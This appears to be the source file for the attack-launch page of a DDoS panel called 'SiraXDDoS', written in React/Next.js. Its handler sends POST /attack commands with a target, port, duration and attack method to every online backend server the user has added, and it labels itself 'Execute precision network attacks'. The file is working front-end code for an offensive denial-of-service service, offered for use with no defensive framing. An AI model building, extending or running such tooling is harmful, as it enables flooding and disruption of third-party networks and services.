
"use client";

import * as React from "react";
import { AttackPanel } from "@/app/components/attack-panel";
import type { MusicPlayerState } from "@/lib/types";
import { useToast } from "@/hooks/use-toast";
import { DashboardState } from "@/lib/state";
import Image from "next/image";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Music } from "lucide-react";
import Link from "next/link";
import { OngoingAttacks } from "@/app/components/ongoing-attacks";
import { AttackStats } from "../components/attack-stats";

type AttackData = {
  target: string;
  port: number;
  duration: number;
  method: string;
};

export default function AttackPage() {
    const { servers, setMusicPlayer, attacks, liveStats } = DashboardState.useState();
    const { toast } = useToast();

    const handleStartAttack = async (data: AttackData) => {
        const onlineServers = servers.filter(s => s.status === 'Online');
        if (onlineServers.length === 0) {
            toast({
                title: "No Online Servers",
                description: "Cannot start an attack. Please add and test at least one API server in the Server page.",
                variant: "destructive",
            });
            return;
        }

        toast({
            title: "Sending Attack Commands...",
            description: `Attempting to launch ${data.method} attack on ${data.target} via ${onlineServers.length} server(s).`,
        });

        let commandsSent = 0;
        const attackPromises = onlineServers.map(server => {
            // The backend endpoint is now POST /attack
            const attackUrl = `${server.url}/attack`;
            
            return fetch(attackUrl, { 
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    target: data.target,
                    time: data.duration,
                    methods: data.method,
                    port: data.port,
                })
            })
            .then(res => {
                if (res.status === 202) {
                    commandsSent++;
                } else {
                    res.json().then(err => {
                      console.error(`Command to ${server.url} failed:`, err.message || 'Unknown error');
                    }).catch(() => {
                       console.error(`Command to ${server.url} failed with status ${res.status}`);
                    });
                }
            }).catch(err => {
                console.error(`Failed to send command to ${server.url}:`, err);
            });
        });

        await Promise.all(attackPromises);

        if (commandsSent > 0) {
            toast({
                title: "Commands Accepted",
                description: `Attack commands sent to and accepted by ${commandsSent} server(s).`,
            });
        } else {
            toast({
                title: "Attack Failed",
                description: "Failed to send attack commands to any online server.",
                variant: "destructive",
            });
        }
    };
  
    const handlePlayMusic = () => {
    setMusicPlayer((prev: MusicPlayerState) => {
      if (prev.track) {
        return { ...prev, isPlaying: !prev.isPlaying, isVisible: true, isMinimized: false };
      }
      return {
        ...prev,
        isPlaying: true,
        isVisible: true,
        isExpanded: false,
        isMinimized: false,
        track: {
          title: "An Angels Love ( BreakBeat Remix )",
          artist: "Sira",
          albumArt: "https://raw.githubusercontent.com/IbraDecode/GhTourl/main/files/2025-10-29/1761739220774-photo.jpg",
          audioSrc: "https://raw.githubusercontent.com/IbraDecode/GhTourl/main/files/2025-10-29/1761734096472-2_5193122331429471538.mp3",
        },
      };
    });
  };

  const onlineServerCount = servers.filter(s => s.status === 'Online').length;
  const ongoingAttacks = attacks.filter(a => a.status === 'Ongoing');
  
  return (
    <div className="flex-1 space-y-6 p-4 md:p-6">
        <div className="relative flex flex-col items-center justify-center text-center p-8 md:p-12 rounded-xl bg-card shadow-sm overflow-hidden min-h-[200px]">
          <Image
            src="https://raw.githubusercontent.com/IbraDecode/GhTourl/main/files/2025-10-30/1761810438881-photo.jpg"
            alt="Attack Page Hero Image"
            fill
            className="object-cover opacity-20"
            data-ai-hint="digital warfare"
          />
          <div className="relative z-10">
            <h1 className="text-3xl md:text-4xl font-bold text-foreground font-headline">
              Launch Attack
            </h1>
            <p className="mt-2 text-base md:text-lg text-muted-foreground max-w-2xl mx-auto">
              Execute precision network attacks.
            </p>
          </div>
           <Button onClick={handlePlayMusic} variant="link" className="mt-4 z-10 text-muted-foreground hover:text-primary">
            <Music className="mr-2 h-4 w-4" />
            sebelum ddos dengerin musik asik bro
          </Button>
          <p className="z-10 text-xs text-muted-foreground/80 mt-2">Built By <Link href="https.t.me/ibradecode" target="_blank" className="underline hover:text-primary">IbraDecode</Link></p>
        </div>
        
        <AttackStats stats={liveStats} ongoingAttacks={ongoingAttacks.length > 0} />

        <Card className="relative overflow-hidden">
            <Image
                src="https://raw.githubusercontent.com/IbraDecode/GhTourl/main/files/2025-10-30/1761810454405-photo.jpg"
                alt="SiraXDDoS Panel Background"
                fill
                className="object-cover opacity-10"
                data-ai-hint="digital binary code"
            />
            <div className="relative">
                <CardContent className="p-6">
                    <AttackPanel onStartAttack={handleStartAttack} serverCount={onlineServerCount} />
                </CardContent>
            </div>
        </Card>
        <OngoingAttacks attacks={ongoingAttacks} />
    </div>
  );
}

    